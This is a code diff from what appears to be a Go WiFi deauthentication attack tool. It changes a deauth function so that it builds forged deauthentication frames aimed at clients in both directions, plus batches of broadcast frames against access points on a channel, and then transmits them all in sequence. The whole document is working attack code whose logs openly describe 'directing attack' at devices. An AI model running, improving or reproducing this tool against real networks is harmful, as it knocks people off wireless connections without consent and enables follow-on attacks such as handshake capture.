@@ -95,6 +95,8 @@ func (a *APManager) deauth(ch byte) {
 		log.Println("no APs and client devices to attack")
 	}
 
+	allPackets := make([][]byte, 0)
+
 	if len(a.ClientsMap) > 0 {
 		a.ClientMutex.Lock()
 
@@ -102,17 +104,9 @@ func (a *APManager) deauth(ch byte) {
 			client := a.ClientsMap[clientKey]
 			if ch == client.APChannel {
 				log.Printf("directing attack at addr1=%s, add2=%s AP=%s", client.Addr1, client.Addr2, client.APSSID)
-				for i := 0; i < 100; i++ {
-					pack1 := a.createPacket(client.Addr1, client.Addr2, client.Addr2, uint16(i))
-					// pack2 := a.createPacket(client.Addr2, client.Addr1, client.Addr1, uint16(i))
-
-					// send packet
-					a.WriteHandle.WritePacketData(pack1)
-					time.Sleep(10 * time.Millisecond)
-
-					// a.WriteHandle.WritePacketData(pack2)
-					// time.Sleep(10 * time.Millisecond)
-				}
+				pack1 := a.createPacket(client.Addr1, client.Addr2, client.Addr2, uint16(0))
+				pack2 := a.createPacket(client.Addr2, client.Addr1, client.Addr1, uint16(0))
+				allPackets = append(allPackets, pack1, pack2)
 			}
 		}
 
@@ -126,15 +120,20 @@ func (a *APManager) deauth(ch byte) {
 			ap := a.APMap[apKey]
 			if ch == ap.Channel {
 				log.Printf("broadcasting attack at AP=%s", ap.SSID)
-				for i := 0; i < 100; i++ {
+				for i := 0; i < 32; i++ {
 					pack1 := a.createPacket(a.BroadcastMac, ap.BSSID, ap.BSSID, uint16(i))
-					a.WriteHandle.WritePacketData(pack1)
-					time.Sleep(10 * time.Millisecond)
+					allPackets = append(allPackets, pack1)
 				}
 			}
 		}
 
 		a.APMutex.Unlock()
+	}
+
+	log.Printf("sending %d packets", len(allPackets))
+	for _, packet := range allPackets {
+		a.WriteHandle.WritePacketData(packet)
+		time.Sleep(10 * time.Millisecond)
 	}
 }
 
